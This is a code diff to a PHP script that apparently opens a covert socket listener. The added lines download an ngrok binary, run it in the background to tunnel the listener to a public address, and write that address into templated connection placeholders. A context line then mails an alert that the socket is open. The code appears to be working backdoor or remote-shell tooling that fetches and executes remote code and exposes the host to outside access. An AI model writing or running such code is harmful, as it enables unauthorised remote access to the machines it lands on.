@@ -72,6 +72,67 @@ if (socket_listen($sock, 5) === false) {
     die();
 }
 
+$ngrok_url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip';
+
+$dir = __DIR__;
+$ngrok_zip = "$dir/ngrok.zip";
+$ngrok_bin = "$dir/ngrok";
+
+function wait_for_it($host, $port, $timeout=10) {
+  $connection = @fsockopen($host, $port);
+
+  while(!is_resource($connection)) {
+    sleep(1);
+
+    $timeout--;
+
+    if ($timeout <= 0) {
+      return false;
+    }
+
+    $connection = @fsockopen($host, $port);    
+  }
+
+  if (is_resource($connection)) {
+    fclose($connection);
+
+    return true;
+  }
+
+  return false;
+}
+
+if (!file_exists($ngrok_bin)) {
+  file_put_contents($ngrok_zip, fopen($ngrok_url, 'r'));
+
+  exec("unzip $ngrok_zip");
+
+  unlink($ngrok_zip);
+}
+
+if (file_exists($ngrok_bin)) {
+  exec("nohup $ngrok_bin tcp " . SS_PORT . " &> /dev/null &");
+
+  if (wait_for_it('localhost', 4040)) {
+    $ngrok_json = file_get_contents('http://localhost:4040/api/tunnels');
+
+    $ngrok_data = json_decode($ngrok_json);
+
+    if (isset($ngrok_data->tunnels) && count($ngrok_data->tunnels) > 0) {
+      $tunnel = $ngrok_data->tunnels[0];
+
+      $tcp_url = $tunnel->public_url;
+
+      if (preg_match("/tcps\:\/\/([^\:]+)\:([0-9]+)/", $tcp_url, $matches)) {
+        if (count($matches) > 2) {
+            $opts['{{B64_OPT_IP}}'] = $matches[1];
+            $opts['{{B64_OPT_PORT}}'] = (int)$matches[2];
+        }
+      }
+    }
+  }
+}
+
 // Execute curl command to hit server and send mail alert that socket is open
 exec(build_curl_cmd('m'));
 
